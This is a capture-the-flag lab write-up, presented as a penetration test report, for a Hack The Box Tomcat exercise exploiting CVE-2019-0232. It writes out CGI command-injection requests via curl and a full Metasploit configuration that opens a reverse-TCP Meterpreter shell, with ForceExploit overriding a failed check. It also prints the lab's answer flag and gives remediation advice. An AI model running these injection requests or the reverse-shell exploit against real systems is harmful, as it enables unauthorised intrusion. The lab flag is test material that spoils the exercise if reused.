## Penetration Testing Assessment Report

**Assessment:** Hack The Box — Attacking Common Applications: Skills Assessment I  
**Target:** `10.129.156.48`  
**Assessment Type:** Authorized penetration test / skills assessment  
**Primary Finding:** Remote Command Execution against Apache Tomcat CGI  
**Severity:** Critical  
**Status:** Successfully Exploited

---

# 1. Executive Summary

During the assessment, the target host was enumerated to identify exposed network services and potentially vulnerable applications.

The assessment identified an Apache Tomcat web server running on TCP port `8080`. The application version was determined to be:

```text
Apache Tomcat 9.0.0.M1
```

This version falls within the affected range for **CVE-2019-0232**, a command-injection vulnerability in Tomcat's CGI Servlet when command-line arguments are enabled on a Windows system.

Further enumeration identified a CGI endpoint:

```text
/cgi/cmd.bat
```

The CGI functionality allowed commands to be passed through the HTTP query string and executed by the underlying Windows command interpreter.

The vulnerability was ultimately exploited using the Metasploit Framework's:

```text
exploit/windows/http/tomcat_cgi_cmdlineargs
```

module.

The initial vulnerability check incorrectly reported that the target was not exploitable. Because the CGI functionality and vulnerable configuration had already been established during enumeration, the exploit was executed with `ForceExploit` enabled.

A Meterpreter session was successfully obtained on the target.

The final objective was completed by accessing the Administrator user's desktop and retrieving:

```text
f55763d31a8f63ec935abd07aee5d3d0
```

This demonstrates successful remote code execution and compromise of the target host.

---

# 2. Assessment Objectives

The objectives of the assessment were:

1. Enumerate the target host.
    
2. Identify potentially vulnerable applications.
    
3. Determine the vulnerable application's:
    
    - Name
        
    - Port
        
    - Version
        
4. Identify an applicable vulnerability.
    
5. Exploit the vulnerability to obtain a shell.
    
6. Retrieve the contents of:
    

```text
C:\Users\Administrator\Desktop\flag.txt
```

---

# 3. Target Information

The target was initially assigned an address during the assessment and was subsequently reset. The final target used for successful exploitation was:

```text
10.129.156.48
```

The attack machine was Kali Linux with the following callback address:

```text
10.10.17.228
```

The final reverse TCP listener was configured on:

```text
10.10.17.228:4445
```

---

# 4. Initial Enumeration

A full TCP port scan with service and operating-system detection was performed.

```bash
nmap -p- -sC -sV -O -T4 --open 10.129.155.214
```

The scan identified multiple services, including:

```text
21/tcp     FTP
80/tcp     HTTP
135/tcp    MSRPC
139/tcp    NetBIOS
445/tcp    SMB
3389/tcp   RDP
5985/tcp   WinRM
8000/tcp   HTTP
8009/tcp   AJP
8080/tcp   HTTP
```

Of particular interest was TCP port `8080`.

The service enumeration identified:

```text
Apache Tomcat/Coyote JSP engine 1.1
Apache-Coyote/1.1
Apache Tomcat/9.0.0.M1
```

The Tomcat version was significant because `9.0.0.M1` is an affected version for the Tomcat CGI command-injection vulnerability.

---

# 5. Application Identification

The Tomcat landing page was accessed using:

```bash
curl -i http://10.129.155.214:8080/
```

The response identified the application as Apache Tomcat:

```text
Server: Apache-Coyote/1.1
```

The page title also identified:

```text
Apache Tomcat/9.0.0.M1
```

Therefore, the assessment questions regarding the application were answered as:

|Question|Result|
|---|---|
|Vulnerable application|**Tomcat**|
|Application port|**8080**|
|Application version|**9.0.0.M1**|

---

# 6. Vulnerability Research

The identified Tomcat version was investigated for known vulnerabilities.

SearchSploit enumeration was performed:

```bash
searchsploit "Apache Tomcat 9.0"
```

Among the results was a Tomcat CGI command-injection vulnerability affecting Windows installations.

The relevant vulnerability was:

```text
CVE-2019-0232
```

CVE-2019-0232 affects Apache Tomcat's CGI Servlet when command-line arguments are enabled.

The affected version range includes:

```text
Tomcat 9.0.0.M1 – 9.0.17
Tomcat 8.5.0 – 8.5.39
Tomcat 7.0.0 – 7.0.93
```

The identified target version, `9.0.0.M1`, therefore falls within the affected range.

---

# 7. CGI Enumeration

The CGI functionality was investigated under the default CGI directory:

```text
/cgi
```

A wordlist-based enumeration was performed using FFUF:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
-u http://10.129.155.214:8080/cgi/FUZZ.bat
```

The scan returned:

```text
cmd [Status: 200, Size: 0, Words: 1, Lines: 1]
```

This identified:

```text
/cgi/cmd.bat
```

The existence of a Windows batch file under Tomcat's CGI directory was significant because CGI scripts can pass query-string parameters to the underlying executable.

The CGI enumeration methodology and the use of `.cmd`/`.bat` extensions are consistent with the Tomcat CGI exploitation technique.

---

# 8. Confirming Command Execution

The discovered CGI endpoint was tested with a command:

```bash
curl -i "http://10.129.155.214:8080/cgi/cmd.bat?&dir"
```

The server returned:

```text
Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

12/09/2025  04:36 AM    <DIR>          .
12/09/2025  04:36 AM    <DIR>          ..
09/01/2021  07:58 AM    <DIR>          %SystemDrive%
08/31/2021  01:55 PM                48 cmd.bat
```

This provided direct evidence that the HTTP request was causing the Windows command interpreter to execute the supplied command.

The CGI environment was also queried:

```bash
curl -i "http://10.129.155.214:8080/cgi/cmd.bat?&set"
```

The response exposed:

```text
COMSPEC=C:\Windows\system32\cmd.exe
```

The server subsequently generated a Tomcat error after the CGI response had already been committed. Importantly, the command output had already demonstrated command execution.

The CGI exploitation technique relies on Tomcat passing query-string arguments to the Windows command interpreter.

---

# 9. Exploitation Method

The Metasploit Framework was used to automate exploitation.

Metasploit was launched:

```bash
msfconsole -q
```

The Tomcat CGI exploit was located with:

```text
search tomcat
```

The relevant module was:

```text
exploit/windows/http/tomcat_cgi_cmdlineargs
```

The module description identified the target as:

```text
Apache Tomcat 9.0 or prior for Windows
```

The module corresponds to the Tomcat CGI Servlet command-line argument vulnerability.

---

# 10. Exploit Configuration

The exploit module was selected:

```text
use exploit/windows/http/tomcat_cgi_cmdlineargs
```

The final target had been reset, changing its address to:

```text
10.129.156.48
```

The exploit was configured as follows:

```text
set RHOSTS 10.129.156.48
set RPORT 8080
set TARGETURI /cgi/cmd.bat
set LHOST 10.10.17.228
set LPORT 4445
```

Final configuration:

|Option|Value|
|---|---|
|RHOSTS|`10.129.156.48`|
|RPORT|`8080`|
|TARGETURI|`/cgi/cmd.bat`|
|LHOST|`10.10.17.228`|
|LPORT|`4445`|
|Payload|`windows/meterpreter/reverse_tcp`|

The module's normal configuration uses the target URI to specify the vulnerable CGI script and a Windows Meterpreter reverse TCP payload.

---

# 11. Automatic Vulnerability Check

The exploit was initially executed normally:

```text
run
```

Metasploit returned:

```text
Exploit aborted due to failure: not-vulnerable
The target is not exploitable.
```

This was an important observation because the automated check did not recognize the target as vulnerable.

However, manual enumeration had already established the relevant CGI functionality and command execution behavior.

Therefore, the exploit's automatic vulnerability check was overridden:

```text
set ForceExploit true
```

This instructed Metasploit to proceed despite the negative automatic check.

The use of the exploit module with `ForceExploit` is also demonstrated in the assessment workflow.

---

# 12. Successful Exploitation

The exploit was executed:

```text
exploit
```

Metasploit started the reverse TCP handler:

```text
Started reverse TCP handler on 10.10.17.228:4445
```

The command stager successfully transferred to the target:

```text
Command Stager progress - 60.25% done
Command Stager progress - 100.00% done
```

The target connected back to the attacker:

```text
Meterpreter session 1 opened
```

The successful connection was:

```text
10.10.17.228:4445 -> 10.129.156.48:49689
```

This confirmed successful remote code execution.

---

# 13. Obtaining a Windows Shell

The Meterpreter session was converted into a Windows command shell:

```text
shell
```

The resulting shell identified the Windows environment:

```text
Microsoft Windows [Version 10.0.17763.107]
```

The current working directory was:

```text
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi>
```

At this point, interactive command execution on the target had been achieved.

---

# 14. Flag Retrieval

The assessment required the contents of:

```text
C:\Users\Administrator\Desktop\flag.txt
```

The flag was retrieved from the Administrator desktop using:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

The returned flag was:

```text
f55763d31a8f63ec935abd07aee5d3d0
```

---

# 15. Attack Chain

The complete attack chain can be summarized as:

```text
Target Enumeration
        │
        ▼
Apache Tomcat identified
        │
        ▼
TCP/8080 identified
        │
        ▼
Tomcat 9.0.0.M1 identified
        │
        ▼
CGI functionality enumerated
        │
        ▼
/cgi/cmd.bat discovered
        │
        ▼
Command execution confirmed
        │
        ▼
CVE-2019-0232 identified
        │
        ▼
Metasploit tomcat_cgi_cmdlineargs
        │
        ▼
Automatic check returned "not vulnerable"
        │
        ▼
ForceExploit enabled
        │
        ▼
Windows command stager delivered
        │
        ▼
Meterpreter reverse TCP session
        │
        ▼
Windows shell
        │
        ▼
Administrator Desktop
        │
        ▼
flag.txt retrieved
```

---

# 16. Evidence of Compromise

The following evidence demonstrates successful exploitation:

### Vulnerable Application

```text
Apache Tomcat 9.0.0.M1
```

### Vulnerable Endpoint

```text
/cgi/cmd.bat
```

### Command Execution

```text
curl -i "http://10.129.155.214:8080/cgi/cmd.bat?&dir"
```

Returned a Windows directory listing from the Tomcat CGI directory.

### CGI Environment

```text
COMSPEC=C:\Windows\system32\cmd.exe
```

### Exploitation Framework

```text
Metasploit Framework
```

### Exploit Module

```text
exploit/windows/http/tomcat_cgi_cmdlineargs
```

### Successful Session

```text
Meterpreter session 1 opened
```

### Final Flag

```text
f55763d31a8f63ec935abd07aee5d3d0
```

---

# 17. Security Impact

The vulnerability provided remote command execution against the Windows host running Tomcat.

Successful exploitation allowed an attacker to:

- Execute operating-system commands remotely.
    
- Execute commands in the security context of the Tomcat CGI process.
    
- Deploy a command stager.
    
- Establish an interactive Meterpreter session.
    
- Access files available to the compromised process.
    
- Ultimately retrieve a file from the Administrator desktop.
    

Because the vulnerability resulted in remote code execution, exploitation could lead to complete compromise of the affected application server depending on the privileges of the Tomcat service account.

**Severity: Critical**

---

# 18. Root Cause

The root cause was the insecure configuration of Tomcat's CGI Servlet on a Windows system.

When command-line arguments are enabled, CGI requests can cause query-string data to be passed to the operating-system command interpreter.

On vulnerable Windows configurations, inadequate validation of these arguments allows an attacker to inject additional commands.

The vulnerability is specifically associated with Tomcat's `enableCmdLineArguments` CGI behavior and affects the documented Tomcat versions identified above.

---

# 19. Remediation Recommendations

## 19.1 Upgrade Apache Tomcat

The affected Tomcat installation should be upgraded to a version that is no longer vulnerable to CVE-2019-0232.

The installed version:

```text
9.0.0.M1
```

is extremely old and should not remain in production.

A currently supported Tomcat release should be selected according to the application's compatibility requirements.

---

## 19.2 Disable CGI Command-Line Arguments

If CGI functionality is not required, it should be disabled entirely.

If CGI is required, command-line argument processing should be disabled:

```text
enableCmdLineArguments=false
```

This prevents CGI query-string parameters from being interpreted as operating-system command-line arguments.

---

## 19.3 Remove Unnecessary CGI Scripts

The discovered CGI script:

```text
/cgi/cmd.bat
```

should not be exposed unless there is a legitimate business requirement.

Unnecessary batch files and CGI endpoints should be removed.

---

## 19.4 Restrict Administrative Interfaces

Tomcat administration interfaces and management endpoints should be restricted to trusted administrative networks.

Access should not be exposed unnecessarily to untrusted users.

---

## 19.5 Run Tomcat With Least Privilege

The Tomcat service should operate under a dedicated low-privilege account.

The service account should not have administrative privileges or unnecessary access to sensitive files.

---

## 19.6 Network Segmentation

Tomcat servers should be placed behind appropriate network controls.

Only required application ports should be accessible from untrusted networks.

Administrative services should be restricted through firewall rules, VPNs, or dedicated management networks.

---

## 19.7 Continuous Vulnerability Management

Organizations should maintain an inventory of deployed application versions and regularly scan for:

- End-of-life software
    
- Known CVEs
    
- Exposed management interfaces
    
- Dangerous default configurations
    
- Unnecessary CGI functionality
    

---

# 20. Assessment Questions and Answers

|Question|Answer|
|---|---|
|What vulnerable application is running?|**Tomcat**|
|What port is the application running on?|**8080**|
|What version is in use?|**9.0.0.M1**|
|What vulnerability was exploited?|**CVE-2019-0232 — Tomcat CGI command injection**|
|CGI endpoint|**`/cgi/cmd.bat`**|
|Exploitation framework|**Metasploit**|
|Exploit module|**`exploit/windows/http/tomcat_cgi_cmdlineargs`**|
|Shell obtained|**Meterpreter / Windows shell**|
|Flag|**`f55763d31a8f63ec935abd07aee5d3d0`**|

---

# 21. Conclusion

The assessment successfully demonstrated a complete attack path against the target.

Apache Tomcat `9.0.0.M1` was identified as the vulnerable application running on TCP port `8080`. Further enumeration identified a Windows CGI batch script at:

```text
/cgi/cmd.bat
```

The CGI implementation allowed operating-system commands to be executed through HTTP requests, providing a path to exploitation of the Tomcat CGI command-line argument vulnerability.

Metasploit was subsequently used to weaponize the vulnerability and establish a reverse Meterpreter connection.

Despite the automated exploit check reporting the target as not vulnerable, manually established evidence of the vulnerable CGI functionality justified proceeding with the exploit using `ForceExploit`.

The exploitation was successful, resulting in a Windows shell and access to the target environment. The final objective was completed by retrieving the contents of the Administrator's `flag.txt`.

**Final flag:**

```text
f55763d31a8f63ec935abd07aee5d3d0
```

**Assessment Result: SUCCESSFUL COMPROMISE**